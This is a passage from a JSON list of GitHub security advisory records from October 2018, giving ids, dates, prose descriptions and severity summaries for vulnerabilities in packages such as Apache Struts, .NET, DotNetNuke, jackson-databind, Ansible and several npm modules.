    "description": "A denial of service vulnerability exists when .NET and .NET Core improperly process XML documents, aka \".NET and .NET Core Denial of Service Vulnerability.\" This affects Microsoft .NET Framework 2.0, Microsoft .NET Framework 3.0, Microsoft .NET Framework 4.7.1, Microsoft .NET Framework 4.6/4.6.1/4.6.2/4.7/4.7.1, Microsoft .NET Framework 4.5.2, Microsoft .NET Framework 4.7/4.7.1, Microsoft .NET Framework 4.6, Microsoft .NET Framework 3.5, Microsoft .NET Framework 3.5.1, Microsoft .NET Framework 4.6/4.6.1/4.6.2, Microsoft .NET Framework 4.6.2/4.7/4.7.1, .NET Core 2.0, Microsoft .NET Framework 4.7.2.",
    "summary": "Moderate severity vulnerability that affects System.Security.Cryptography.Xml"
  },
  {
    "ghsaId": "GHSA-782p-53wq-cxmj",
    "publishedAt": "2018-10-16T19:51:31Z",
    "description": "Buffer overflow in OPC UA applications allows remote attackers to trigger a stack overflow with carefully structured requests.",
    "summary": "High severity vulnerability that affects OPCFoundation.NetStandard.Opc.Ua"
  },
  {
    "ghsaId": "GHSA-8336-mxp6-v5h9",
    "publishedAt": "2018-10-16T19:51:18Z",
    "description": "Failure to validate certificates in OPC Foundation UA Client Applications communicating without security allows attackers with control over a piece of network infrastructure to decrypt passwords.",
    "summary": "Moderate severity vulnerability that affects OPCFoundation.NetStandard.Opc.Ua"
  },
  {
    "ghsaId": "GHSA-7xr3-rgwh-pw22",
    "publishedAt": "2018-10-16T19:50:39Z",
    "description": "A Denial of Service vulnerability was found in Apache Qpid Broker-J versions 7.0.0-7.0.4 when AMQP protocols 0-8, 0-9 or 0-91 are used to publish messages with size greater than allowed maximum message size limit (100MB by default). The broker crashes due to the defect. AMQP protocols 0-10 and 1.0 are not affected.",
    "summary": "Moderate severity vulnerability that affects org.apache.qpid:apache-qpid-broker-j"
  },
  {
    "ghsaId": "GHSA-f5cf-f7px-xpmh",
    "publishedAt": "2018-10-16T19:50:27Z",
    "description": "The (1) proton.reactor.Connector, (2) proton.reactor.Container, and (3) proton.utils.BlockingConnection classes in Apache Qpid Proton before 0.12.1 improperly use an unencrypted connection for an amqps URI scheme when SSL support is unavailable, which might allow man-in-the-middle attackers to obtain sensitive information or modify data via unspecified vectors.",
    "summary": "Moderate severity vulnerability that affects org.apache.qpid:proton-j"
  },
  {
    "ghsaId": "GHSA-jj9h-mwhq-8vhm",
    "publishedAt": "2018-10-16T19:50:13Z",
    "description": "PlainSaslServer.java in Apache Qpid Java before 6.0.3, when the broker is configured to allow plaintext passwords, allows remote attackers to cause a denial of service (broker termination) via a crafted authentication attempt, which triggers an uncaught exception.",
    "summary": "Moderate severity vulnerability that affects org.apache.qpid:qpid-broker"
  },
  {
    "ghsaId": "GHSA-q66c-h853-gqw2",
    "publishedAt": "2018-10-16T19:49:48Z",
    "description": "The AMQP 0-8, 0-9, 0-91, and 0-10 connection handling in Apache Qpid Java before 6.0.3 might allow remote attackers to bypass authentication and consequently perform actions via vectors related to connection state logging.",
    "summary": "Moderate severity vulnerability that affects org.apache.qpid:qpid-broker-plugins-amqp-0-8-protocol and org.apache.qpid:qpid-broker-plugins-amqp-1-0-protocol"
  },
  {
    "ghsaId": "GHSA-49h4-g8p5-jgq6",
    "publishedAt": "2018-10-16T19:49:32Z",
    "description": "After logging into the portal, the logout jsp page redirects the browser back to the login page after. It is feasible for malicious users to redirect the browser to an unintended web page in Apache jUDDI 3.1.2, 3.1.3, 3.1.4, and 3.1.5 when utilizing the portlets based user interface also known as 'Pluto', 'jUDDI Portal', 'UDDI Portal' or 'uddi-console'. User session data, credentials, and auth tokens are cleared before the redirect.",
    "summary": "Moderate severity vulnerability that affects org.apache.juddi:juddi-client"
  },
  {
    "ghsaId": "GHSA-gg9m-fj3v-r58c",
    "publishedAt": "2018-10-16T19:37:56Z",
    "description": "The REST Plugin in Apache Struts 2.1.2 through 2.3.x before 2.3.34 and 2.5.x before 2.5.13 uses an XStreamHandler with an instance of XStream for deserialization without any type filtering, which can lead to Remote Code Execution when deserializing XML payloads.",
    "summary": "Moderate severity vulnerability that affects org.apache.struts:struts2-rest-plugin"
  },
  {
    "ghsaId": "GHSA-x5x7-3v85-wpc4",
    "publishedAt": "2018-10-16T19:37:33Z",
    "description": "In Apache Struts 2.3.7 through 2.3.33 and 2.5 through 2.5.12, if an application allows entering a URL in a form field and built-in URLValidator is used, it is possible to prepare a special URL which will be used to overload server process when performing validation of the URL.  NOTE: this vulnerability exists because of an incomplete fix for S2-047 / CVE-2017-7672.",
    "summary": "Moderate severity vulnerability that affects org.apache.struts:struts2-core"
  },
  {
    "ghsaId": "GHSA-vwxj-6m5m-rrvh",
    "publishedAt": "2018-10-16T19:37:22Z",
    "description": "The REST Plugin in Apache Struts 2.3.7 through 2.3.33 and 2.5 through 2.5.12 is using an outdated XStream library which is vulnerable and allow perform a DoS attack using malicious request with specially crafted XML payload.",
    "summary": "Moderate severity vulnerability that affects org.apache.struts:struts2-rest-plugin"
  },
  {
    "ghsaId": "GHSA-8mr5-h28g-36qx",
    "publishedAt": "2018-10-16T19:37:07Z",
    "description": "When using a Spring AOP functionality to secure Struts actions it is possible to perform a DoS attack. Solution is to upgrade to Apache Struts version 2.5.12 or 2.3.33.",
    "summary": "Moderate severity vulnerability that affects org.apache.struts:struts2-core"
  },
  {
    "ghsaId": "GHSA-9gp7-jvm2-r4mx",
    "publishedAt": "2018-10-16T19:36:43Z",
    "description": "If an application allows enter an URL in a form field and built-in URLValidator is used, it is possible to prepare a special URL which will be used to overload server process when performing validation of the URL. Solution is to upgrade to Apache Struts version 2.5.12.",
    "summary": "Moderate severity vulnerability that affects org.apache.struts:struts2-core"
  },
  {
    "ghsaId": "GHSA-xcrm-qpp8-hcw4",
    "publishedAt": "2018-10-16T19:35:55Z",
    "description": "In Apache Struts 2.5 to 2.5.14, the REST Plugin is using an outdated JSON-lib library which is vulnerable and allow perform a DoS attack using malicious request with specially crafted JSON payload.",
    "summary": "Moderate severity vulnerability that affects org.apache.struts:struts2-rest-plugin"
  },
  {
    "ghsaId": "GHSA-8fx9-5hx8-crhm",
    "publishedAt": "2018-10-16T19:35:40Z",
    "description": "In Apache Struts 2.0.1 through 2.3.33 and 2.5 through 2.5.10, using an unintentional expression in a Freemarker tag instead of string literals can lead to a RCE attack.",
    "summary": "High severity vulnerability that affects org.apache.struts:struts2-core"
  },
  {
    "ghsaId": "GHSA-38cr-2ph5-frr9",
    "publishedAt": "2018-10-16T19:35:26Z",
    "description": "The Apache Struts REST Plugin is using XStream library which is vulnerable and allow perform a DoS attack when using a malicious request with specially crafted XML payload. Upgrade to the Apache Struts version 2.5.16 and switch to an optional Jackson XML handler as described here http://struts.apache.org/plugins/rest/#custom-contenttypehandlers. Another option is to implement a custom XML handler based on the Jackson XML handler from the Apache Struts 2.5.16.",
    "summary": "Moderate severity vulnerability that affects org.apache.struts:struts2-rest-plugin"
  },
  {
    "ghsaId": "GHSA-x2rg-fmcv-crq5",
    "publishedAt": "2018-10-16T19:34:22Z",
    "description": "DNN (aka DotNetNuke) before 9.1.1 has Remote Code Execution via a cookie, aka \"2017-08 (Critical) Possible remote code execution on DNN sites.\"",
    "summary": "Moderate severity vulnerability that affects DotNetNuke.Core"
  },
  {
    "ghsaId": "GHSA-5c66-x4wm-rjfx",
    "publishedAt": "2018-10-16T19:34:10Z",
    "description": "Cross-site scripting (XSS) vulnerability in the user-profile biography section in DotNetNuke (DNN) before 8.0.1 allows remote authenticated users to inject arbitrary web script or HTML via a crafted onclick attribute in an IMG element.",
    "summary": "Low severity vulnerability that affects DotNetNuke.Core"
  },
  {
    "ghsaId": "GHSA-x8f7-h444-97w4",
    "publishedAt": "2018-10-16T19:33:42Z",
    "description": "The installation wizard in DotNetNuke (DNN) before 7.4.1 allows remote attackers to reinstall the application and gain SuperUser access via a direct request to Install/InstallWizard.aspx.",
    "summary": "High severity vulnerability that affects DotNetNuke.Core"
  },
  {
    "ghsaId": "GHSA-v76m-f5cx-8rg4",
    "publishedAt": "2018-10-16T19:33:25Z",
    "description": "Cross-site scripting (XSS) vulnerability in DotNetNuke (DNN) before 7.4.0 allows remote attackers to inject arbitrary web script or HTML via unspecified vectors.",
    "summary": "Moderate severity vulnerability that affects DotNetNuke.Core"
  },
  {
    "ghsaId": "GHSA-cggj-fvv3-cqwv",
    "publishedAt": "2018-10-16T17:45:18Z",
    "description": "FasterXML jackson-databind before 2.8.11.1 and 2.9.x before 2.9.5 allows unauthenticated remote code execution because of an incomplete fix for the CVE-2017-7525 deserialization flaw. This is exploitable by sending maliciously crafted JSON input to the readValue method of the ObjectMapper, bypassing a blacklist that is ineffective if the c3p0 libraries are available in the classpath.",
    "summary": "High severity vulnerability that affects com.fasterxml.jackson.core:jackson-databind"
  },
  {
    "ghsaId": "GHSA-xqj7-j8j5-f2xr",
    "publishedAt": "2018-10-16T17:44:39Z",
    "description": "Bouncy Castle BC 1.54 - 1.59, BC-FJA 1.0.0, BC-FJA 1.0.1 and earlier have a flaw in the Low-level interface to RSA key pair generator, specifically RSA Key Pairs generated in low-level API with added certainty may have less M-R tests than expected. This appears to be fixed in versions BC 1.60 beta 4 and later, BC-FJA 1.0.2 and later.",
    "summary": "Moderate severity vulnerability that affects org.bouncycastle:bcprov-jdk14 and org.bouncycastle:bcprov-jdk15"
  },
  {
    "ghsaId": "GHSA-mwcx-532g-8pq3",
    "publishedAt": "2018-10-16T17:44:11Z",
    "description": "In Eclipse Jetty versions 9.4.0 through 9.4.8, when using the optional Jetty provided FileSessionDataStore for persistent storage of HttpSession details, it is possible for a malicious user to access/hijack other HttpSessions and even delete unmatched HttpSessions present in the FileSystem's storage for the FileSessionDataStore.",
    "summary": "Moderate severity vulnerability that affects org.eclipse.jetty:jetty-server"
  },
  {
    "ghsaId": "GHSA-f26x-pr96-vw86",
    "publishedAt": "2018-10-16T17:43:45Z",
    "description": "Spring Framework, versions 5.0.x prior to 5.0.7 and 4.3.x prior to 4.3.18 and older unsupported versions, allows web applications to enable cross-domain requests via JSONP (JSON with Padding) through AbstractJsonpResponseBodyAdvice for REST controllers and MappingJackson2JsonView for browser requests. Both are not enabled by default in Spring Framework nor Spring Boot, however, when MappingJackson2JsonView is configured in an application, JSONP support is automatically ready to use through the \"jsonp\" and \"callback\" JSONP parameters, enabling cross-domain requests.",
    "summary": "Moderate severity vulnerability that affects org.springframework:spring-core"
  },
  {
    "ghsaId": "GHSA-9gcm-f4x3-8jpw",
    "publishedAt": "2018-10-16T17:35:54Z",
    "description": "Spring Framework (versions 5.0.x prior to 5.0.7, versions 4.3.x prior to 4.3.18, and older unsupported versions) allow web applications to change the HTTP request method to any HTTP method (including TRACE) using the HiddenHttpMethodFilter in Spring MVC. If an application has a pre-existing XSS vulnerability, a malicious user (or attacker) can use this filter to escalate to an XST (Cross Site Tracing) attack.",
    "summary": "Moderate severity vulnerability that affects org.springframework:spring-core"
  },
  {
    "ghsaId": "GHSA-898j-5cc8-cmf5",
    "publishedAt": "2018-10-16T17:35:24Z",
    "description": "Apache Storm version 1.0.6 and earlier, 1.2.1 and earlier, and version 1.1.2 and earlier expose an arbitrary file write vulnerability, that can be achieved using a specially crafted zip archive (affects other archives as well, bzip2, tar, xz, war, cpio, 7z), that holds path traversal filenames. So when the filename gets concatenated to the target extraction directory, the final path ends up outside of the target folder.",
    "summary": "Moderate severity vulnerability that affects org.apache.storm:storm-core"
  },
  {
    "ghsaId": "GHSA-xpwp-rq3x-x6v7",
    "publishedAt": "2018-10-16T17:35:04Z",
    "description": "The Recurly Client .NET Library before 1.0.1, 1.1.10, 1.2.8, 1.3.2, 1.4.14, 1.5.3, 1.6.2, 1.7.1, 1.8.1 is vulnerable to a Server-Side Request Forgery vulnerability due to incorrect use of \"Uri.EscapeUriString\" that could result in compromise of API keys or other critical resources.",
    "summary": "Critical severity vulnerability that affects recurly-api-client"
  },
  {
    "ghsaId": "GHSA-rr3c-f55v-qhv5",
    "publishedAt": "2018-10-16T17:34:00Z",
    "description": "Microsoft .NET Framework 1.1, 2.0, 3.0, 3.5, 3.5.1, 4, 4.5, 4.5.1, 4.5.2, 4.6, 4.6.1, 4.6.2 and 5.7 and .NET Core 1.0. 1.1 and 2.0 allow a denial of service vulnerability due to the way XML documents are processed, aka \".NET and .NET Core Denial Of Service Vulnerability\". This CVE is unique from CVE-2018-0765.",
    "summary": "Moderate severity vulnerability that affects System.Security.Cryptography.Xml"
  },
  {
    "ghsaId": "GHSA-hvpr-9cr6-q5v7",
    "publishedAt": "2018-10-16T17:21:42Z",
    "description": "Apache Camel's camel-snakeyaml component is vulnerable to Java object de-serialization vulnerability. De-serializing untrusted data can lead to security flaws.",
    "summary": "High severity vulnerability that affects org.apache.camel:camel-snakeyaml"
  },
  {
    "ghsaId": "GHSA-qxxx-2pp7-5hmx",
    "publishedAt": "2018-10-16T17:21:35Z",
    "description": "A deserialization flaw was discovered in the jackson-databind, versions before 2.6.7.1, 2.7.9.1 and 2.8.9, which could allow an unauthenticated user to perform code execution by sending the maliciously crafted input to the readValue method of the ObjectMapper.",
    "summary": "High severity vulnerability that affects com.fasterxml.jackson.core:jackson-databind"
  },
  {
    "ghsaId": "GHSA-g8j6-m4p7-5rfq",
    "publishedAt": "2018-10-16T17:18:12Z",
    "description": "DNN (aka DotNetNuke) before 9.2.0 suffers from a Server-Side Request Forgery (SSRF) vulnerability in the DnnImageHandler class. Attackers may be able to access information about internal network resources.",
    "summary": "High severity vulnerability that affects DotNetNuke.Core"
  },
  {
    "ghsaId": "GHSA-7378-6268-4278",
    "publishedAt": "2018-10-16T17:16:40Z",
    "description": "DotNetZip.Semvered before 1.11.0 is vulnerable to directory traversal, allowing attackers to write to arbitrary files via a ../ (dot dot slash) in a Zip archive entry that is mishandled during extraction. This vulnerability is also known as 'Zip-Slip'.",
    "summary": "High severity vulnerability that affects DotNetZip"
  },
  {
    "ghsaId": "GHSA-6pcc-3rfx-4gpm",
    "publishedAt": "2018-10-16T17:01:25Z",
    "description": "dom4j version prior to version 2.1.1 contains a CWE-91: XML Injection vulnerability in Class: Element. Methods: addElement, addAttribute that can result in an attacker tampering with XML documents through XML injection. This attack appear to be exploitable via an attacker specifying attributes or elements in the XML document. This vulnerability appears to have been fixed in 2.1.1 or later.\n\nNote: This advisory applies to `dom4j:dom4j` version 1.x legacy artifacts.  To resolve this a change to the latest version of `org.dom4j:dom4j` is recommended.",
    "summary": "Moderate severity vulnerability that affects org.dom4j:dom4j"
  },
  {
    "ghsaId": "GHSA-rpch-cqj9-h65r",
    "publishedAt": "2018-10-16T17:01:10Z",
    "description": "YamlDotNet version 4.3.2 and earlier contains a Insecure Direct Object Reference vulnerability in The default behavior of Deserializer.Deserialize() will deserialize user-controlled types in the line \"currentType = Type.GetType(nodeEvent.Tag.Substring(1), throwOnError: false);\" and blindly instantiates them. that can result in Code execution in the context of the running process. This attack appear to be exploitable via Victim must parse a specially-crafted YAML file. This vulnerability appears to have been fixed in 5.0.0.",
    "summary": "High severity vulnerability that affects YamlDotNet and YamlDotNet.Signed"
  },
  {
    "ghsaId": "GHSA-84cm-x2q5-8225",
    "publishedAt": "2018-10-15T22:03:48Z",
    "description": "In Dojo Toolkit before 1.14, there is unescaped string injection in dojox/Grid/DataGrid.",
    "summary": "Critical severity vulnerability that affects dojox"
  },
  {
    "ghsaId": "GHSA-qw96-mm2g-c8m7",
    "publishedAt": "2018-10-15T21:43:12Z",
    "description": "Next.js 7.0.0 and 7.0.1 has XSS via the 404 or 500 /_error page.",
    "summary": "High severity vulnerability that affects next"
  },
  {
    "ghsaId": "GHSA-qhv9-728r-6jqg",
    "publishedAt": "2018-10-10T18:57:02Z",
    "description": "NodeJS Tough-Cookie version 2.2.2 contains a Regular Expression Parsing vulnerability in HTTP request Cookie Header parsing that can result in Denial of Service. This attack appear to be exploitable via Custom HTTP header passed by client. This vulnerability appears to have been fixed in 2.3.0.",
    "summary": "Moderate severity vulnerability that affects tough-cookie"
  },
  {
    "ghsaId": "GHSA-r4x3-g983-9g48",
    "publishedAt": "2018-10-10T17:29:34Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nMultiple directory traversal vulnerabilities in server.rb in Sprockets before 2.0.5, 2.1.x before 2.1.4, 2.2.x before 2.2.3, 2.3.x before 2.3.3, 2.4.x before 2.4.6, 2.5.x before 2.5.1, 2.6.x and 2.7.x before 2.7.1, 2.8.x before 2.8.3, 2.9.x before 2.9.4, 2.10.x before 2.10.2, 2.11.x before 2.11.3, 2.12.x before 2.12.3, and 3.x before 3.0.0.beta.3, as distributed with Ruby on Rails 3.x and 4.x, allow remote attackers to determine the existence of files outside the application root via a ../ (dot dot slash) sequence with (1) double slashes or (2) URL encoding.",
    "summary": "Moderate severity vulnerability that affects sprockets"
  },
  {
    "ghsaId": "GHSA-qw8w-2xcp-xg59",
    "publishedAt": "2018-10-10T17:29:27Z",
    "description": "Phusion Passenger 4.0.37 allows local users to write to certain files and directories via a symlink attack on (1) control_process.pid or a (2) generation-* file.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2014-1831.",
    "summary": "Low severity vulnerability that affects passenger"
  },
  {
    "ghsaId": "GHSA-c7j7-p5jq-26ff",
    "publishedAt": "2018-10-10T17:29:20Z",
    "description": "Phusion Passenger before 4.0.38 allows local users to write to certain files and directories via a symlink attack on (1) control_process.pid or a (2) generation-* file.",
    "summary": "Low severity vulnerability that affects passenger"
  },
  {
    "ghsaId": "GHSA-fxwv-953p-7qpf",
    "publishedAt": "2018-10-10T17:29:13Z",
    "description": "agent/Core/Controller/SendRequest.cpp in Phusion Passenger before 4.0.60 and 5.0.x before 5.0.22, when used in Apache integration mode or in standalone mode without a filtering proxy, allows remote attackers to spoof headers passed to applications by using an _ (underscore) character instead of a - (dash) character in an HTTP header, as demonstrated by an X_User header.",
    "summary": "Moderate severity vulnerability that affects passenger"
  },
  {
    "ghsaId": "GHSA-894f-rw44-qrw5",
    "publishedAt": "2018-10-10T17:28:21Z",
    "description": "mongose was a malicious module published with the intent to hijack environment variables. It has been unpublished by npm.",
    "summary": "Moderate severity vulnerability that affects mongose"
  },
  {
    "ghsaId": "GHSA-j68r-23hj-xf9c",
    "publishedAt": "2018-10-10T17:28:14Z",
    "description": "node-openssl was a malicious module published with the intent to hijack environment variables. It has been unpublished by npm.",
    "summary": "Moderate severity vulnerability that affects node-openssl"
  },
  {
    "ghsaId": "GHSA-8p5p-ff7x-hw7q",
    "publishedAt": "2018-10-10T17:27:58Z",
    "description": "The public node module versions before 0.1.4 allows to embed HTML in file names, which (in certain conditions) might lead to execute malicious JavaScript.",
    "summary": "Moderate severity vulnerability that affects public"
  },
  {
    "ghsaId": "GHSA-cx8m-8xmx-q8v3",
    "publishedAt": "2018-10-10T17:25:12Z",
    "description": "memjs versions <= 1.2.0 allocates and stores buffers on typed input, resulting in DoS and uninitialized memory usage.",
    "summary": "Moderate severity vulnerability that affects memjs"
  },
  {
    "ghsaId": "GHSA-w64c-pxjj-h866",
    "publishedAt": "2018-10-10T17:23:51Z",
    "description": "Ansible before 1.9.2 does not verify that the server hostname matches a domain name in the subject's Common Name (CN) or subjectAltName field of the X.509 certificate, which allows man-in-the-middle attackers to spoof SSL servers via an arbitrary valid certificate.",
    "summary": "Moderate severity vulnerability that affects ansible"
  },
  {
    "ghsaId": "GHSA-rh6x-qvg7-rrmj",
    "publishedAt": "2018-10-10T17:23:45Z",
    "description": "The create_script function in the lxc_container module in Ansible before 1.9.6-1 and 2.x before 2.0.2.0 allows local users to write to arbitrary files or gain privileges via a symlink attack on (1) /opt/.lxc-attach-script, (2) the archived container in the archive_path directory, or the (3) lxc-attach-script.log or (4) lxc-attach-script.err files in the temporary directory.",
    "summary": "High severity vulnerability that affects ansible"
  },
  {
    "ghsaId": "GHSA-9x6q-5423-w5v9",
    "publishedAt": "2018-10-10T17:23:39Z",
    "description": "Ansible before 1.2.1 makes it easier for remote attackers to conduct man-in-the-middle attacks by leveraging failure to cache SSH host keys.",
    "summary": "Moderate severity vulnerability that affects ansible"
  },
  {
    "ghsaId": "GHSA-x4cm-m36h-c6qj",
    "publishedAt": "2018-10-10T17:23:33Z",
    "description": "An input validation vulnerability was found in Ansible's mysql_user module before 2.2.1.0, which may fail to correctly change a password in certain circumstances. Thus the previous password would still be active when it should have been changed.",
    "summary": "Moderate severity vulnerability that affects ansible"
  },
  {
    "ghsaId": "GHSA-cmwx-9m2h-x7v4",
    "publishedAt": "2018-10-10T17:23:26Z",
    "description": "A flaw was found in Ansible before version 2.2.0. The apt_key module does not properly verify key fingerprints, allowing remote adversary to create an OpenPGP key which matches the short key ID and inject this key instead of the correct key.",
    "summary": "Moderate severity vulnerability that affects ansible"
  },
  {
    "ghsaId": "GHSA-jwcc-j78w-j73w",
    "publishedAt": "2018-10-10T17:23:20Z",
    "description": "Ansible 2.5 prior to 2.5.5, and 2.4 prior to 2.4.5, do not honor the no_log task flag for failed tasks. When the no_log flag has been used to protect sensitive data passed to a task from being logged, and that task does not run successfully, Ansible will expose sensitive data in log files and on the terminal of the user running Ansible.",
    "summary": "High severity vulnerability that affects ansible"
  },
  {
    "ghsaId": "GHSA-jg4f-jqm5-4mgq",
    "publishedAt": "2018-10-10T17:23:14Z",
    "description": "Ansible before version 2.2.0 fails to properly sanitize fact variables sent from the Ansible controller. An attacker with the ability to create special variables on the controller could execute arbitrary commands on Ansible clients as the user Ansible runs as.",
    "summary": "Moderate severity vulnerability that affects ansible"
  },
  {
    "ghsaId": "GHSA-m956-frf4-m2wr",
    "publishedAt": "2018-10-10T17:22:53Z",
    "description": "Ansible before versions 2.1.4, 2.2.1 is vulnerable to an improper input validation in Ansible's handling of data sent from client systems. An attacker with control over a client system being managed by Ansible and the ability to send facts back to the Ansible server could use this flaw to execute arbitrary code on the Ansible server using the Ansible server privileges.",
    "summary": "Moderate severity vulnerability that affects ansible"
  },
  {
    "ghsaId": "GHSA-9q2p-fj49-vpxj",
    "publishedAt": "2018-10-10T16:10:46Z",
    "description": "In the marshmallow library before 2.15.1 and 3.x before 3.0.0b9 for Python, the schema \"only\" option treats an empty list as implying no \"only\" option, which allows a request that was intended to expose no fields to instead expose all fields (if the schema is being filtered dynamically using the \"only\" option, and there is a user role that produces an empty value for \"only\").",
    "summary": "High severity vulnerability that affects marshmallow"
  },
  {
    "ghsaId": "GHSA-p28m-34f6-967q",
    "publishedAt": "2018-10-10T16:10:38Z",
    "description": "Python Cryptographic Authority pyopenssl version prior to version 17.5.0 contains a CWE-416: Use After Free vulnerability in X509 object handling that can result in Use after free can lead to possible denial of service or remote code execution.. This attack appear to be exploitable via Depends on the calling application and if it retains a reference to the memory.. This vulnerability appears to have been fixed in 17.5.0.",
    "summary": "High severity vulnerability that affects pyopenssl"
  },
  {
    "ghsaId": "GHSA-2rcm-phc9-3945",
    "publishedAt": "2018-10-10T16:10:23Z",
    "description": "Python Cryptographic Authority pyopenssl version Before 17.5.0 contains a CWE - 401 : Failure to Release Memory Before Removing Last Reference vulnerability in PKCS #12 Store that can result in Denial of service if memory runs low or is exhausted. This attack appear to be exploitable via Depends upon calling application, however it could be as simple as initiating a TLS connection. Anything that would cause the calling application to reload certificates from a PKCS #12 store.. This vulnerability appears to have been fixed in 17.5.0.",
    "summary": "Moderate severity vulnerability that affects pyopenssl"
  },
  {
    "ghsaId": "GHSA-f2j6-wrhh-v25m",
    "publishedAt": "2018-10-10T16:10:10Z",
    "description": "Paramiko version 2.4.1, 2.3.2, 2.2.3, 2.1.5, 2.0.8, 1.18.5, 1.17.6 contains a Incorrect Access Control vulnerability in SSH server that can result in RCE. This attack appear to be exploitable via network connectivity.",
    "summary": "High severity vulnerability that affects paramiko"
  },
  {
    "ghsaId": "GHSA-wgmx-52ph-qqcw",
    "publishedAt": "2018-10-10T16:05:23Z",
    "description": "qutebrowser before version 1.4.1 is vulnerable to a cross-site request forgery flaw that allows websites to access 'qute://*' URLs. A malicious website could exploit this to load a 'qute://settings/set' URL, which then sets 'editor.command' to a bash script, resulting in arbitrary code execution.",
    "summary": "High severity vulnerability that affects qutebrowser"
  },
  {
    "ghsaId": "GHSA-cqjg-whmm-8gv6",
    "publishedAt": "2018-10-09T00:57:28Z",
    "description": "hapi is a web and services application framework. When hapi >= 15.0.0 <= 16.1.0 encounters a malformed `accept-encoding` header an uncaught exception is thrown. This may cause hapi to crash or to hang the client connection until the timeout period is reached.",
    "summary": "Moderate severity vulnerability that affects hapi"
  },
  {
    "ghsaId": "GHSA-6g33-f262-xjp4",
    "publishedAt": "2018-10-09T00:57:21Z",
    "description": "react-native-meteor-oauth is a library for Oauth2 login to a Meteor server in React Native. The oauth Random Token is generated using a non-cryptographically strong RNG (Math.random()).",
    "summary": "Low severity vulnerability that affects randomatic"
  },
  {
    "ghsaId": "GHSA-8w4h-3cm3-2pm2",
    "publishedAt": "2018-10-09T00:56:26Z",
    "description": "atob 2.0.3 and earlier allocates uninitialized Buffers when number is passed in input on Node.js 4.x and below.",
    "summary": "Moderate severity vulnerability that affects atob"
  },
  {
    "ghsaId": "GHSA-hr2v-3952-633q",
    "publishedAt": "2018-10-09T00:44:59Z",
    "description": "The utilities function in all versions <= 0.5.0 of the deep-extend node module can be tricked into modifying the prototype of Object when the attacker can control part of the structure passed to this function. This can let an attacker add or modify existing properties that will exist on all objects.",
    "summary": "High severity vulnerability that affects deep-extend"
  },
  {
    "ghsaId": "GHSA-crvj-3gj9-gm2p",
    "publishedAt": "2018-10-09T00:44:29Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nThe qs module before 1.0.0 in Node.js does not call the compact function for array data, which allows remote attackers to cause a denial of service (memory consumption) by using a large index value to create a sparse array.",
    "summary": "High severity vulnerability that affects qs"
  },
  {
    "ghsaId": "GHSA-hxm2-r34f-qmc5",
    "publishedAt": "2018-10-09T00:40:41Z",
    "description": "Minimatch is a minimal matching utility that works by converting glob expressions into JavaScript `RegExp` objects. The primary function, `minimatch(path, pattern)` in Minimatch 3.0.1 and earlier is vulnerable to ReDoS in the `pattern` parameter.",
    "summary": "High severity vulnerability that affects minimatch"
  },
  {
    "ghsaId": "GHSA-g6f4-j6c2-w3p3",
    "publishedAt": "2018-10-09T00:39:43Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nThe uglify-js package before 2.4.24 for Node.js does not properly account for non-boolean values when rewriting boolean expressions, which might allow attackers to bypass security mechanisms or possibly have unspecified other impact by leveraging improperly rewritten Javascript.",
    "summary": "High severity vulnerability that affects uglify-js"
  },
  {
    "ghsaId": "GHSA-f9cm-p3w6-xvr3",
    "publishedAt": "2018-10-09T00:38:48Z",
    "description": "The qs module before 1.0.0 does not have an option or default for specifying object depth and when parsing a string representing a deeply nested object will block the event loop for long periods of time. An attacker could leverage this to cause a temporary denial-of-service condition, for example, in a web application, other requests would not be processed while this blocking is occurring.",
    "summary": "Moderate severity vulnerability that affects qs"
  },
  {
    "ghsaId": "GHSA-c7hr-j4mj-j2w6",
    "publishedAt": "2018-10-09T00:38:30Z",
    "description": "In jsonwebtoken node module before 4.2.2 it is possible for an attacker to bypass verification when a token digitally signed with an asymmetric key (RS/ES family) of algorithms but instead the attacker send a token digitally signed with a symmetric algorithm (HS* family).",
    "summary": "High severity vulnerability that affects jsonwebtoken"
  },
  {
    "ghsaId": "GHSA-3233-rgx3-c2wh",
    "publishedAt": "2018-10-09T00:38:09Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nmustache package before 2.2.1 for Node.js allows remote attackers to conduct cross-site scripting (XSS) attacks by leveraging a template with an attribute that is not quoted.",
    "summary": "Moderate severity vulnerability that affects mustache"
  },
  {
    "ghsaId": "GHSA-pgv6-jrvv-75jp",
    "publishedAt": "2018-10-09T00:34:30Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nvisionmedia send before 0.8.4 for Node.js uses a partial comparison for verifying whether a directory is within the document root, which allows remote attackers to access restricted directories, as demonstrated using \"public-restricted\" under a \"public\" directory.",
    "summary": "Moderate severity vulnerability that affects send"
  },
  {
    "ghsaId": "GHSA-7mc5-chhp-fmc3",
    "publishedAt": "2018-10-09T00:30:30Z",
    "description": "negotiator is an HTTP content negotiator for Node.js and is used by many modules and frameworks including Express and Koa. The header for \"Accept-Language\", when parsed by negotiator 0.6.0 and earlier is vulnerable to Regular Expression Denial of Service via a specially crafted string.",
    "summary": "High severity vulnerability that affects negotiator"
  },
  {
    "ghsaId": "GHSA-762f-c2wg-m8c8",
    "publishedAt": "2018-10-09T00:27:15Z",
    "description": "protobufjs is vulnerable to ReDoS when parsing crafted invalid .proto files.",
    "summary": "Moderate severity vulnerability that affects protobufjs"
  },
  {
    "ghsaId": "GHSA-qw93-45r3-p66p",
    "publishedAt": "2018-10-09T00:19:57Z",
    "description": "The utilities function in all versions <= 1.0.0 of the merge-options node module can be tricked into modifying the prototype of Object when the attacker can control part of the structure passed to this function. This can let an attacker add or modify existing properties that will exist on all objects.",
    "summary": "High severity vulnerability that affects merge-options"
  },
  {
    "ghsaId": "GHSA-gx5g-xcxj-cx2w",
    "publishedAt": "2018-10-08T23:18:13Z",
    "description": "An authentication bypass flaw was found in the smart_proxy_dynflow component used by Foreman. A malicious attacker can use this flaw to remotely execute arbitrary commands on machines managed by vulnerable Foreman instances, in a highly privileged context.",
    "summary": "Critical severity vulnerability that affects smart_proxy_dynflow"
  },
  {
    "ghsaId": "GHSA-5hg3-6c2f-f3wr",
    "publishedAt": "2018-10-04T21:58:46Z",
    "description": "django.middleware.common.CommonMiddleware in Django 1.11.x before 1.11.15 and 2.0.x before 2.0.8 has an Open Redirect.",
    "summary": "Moderate severity vulnerability that affects django"
  },
  {
    "ghsaId": "GHSA-2m8h-fgr8-2q9w",
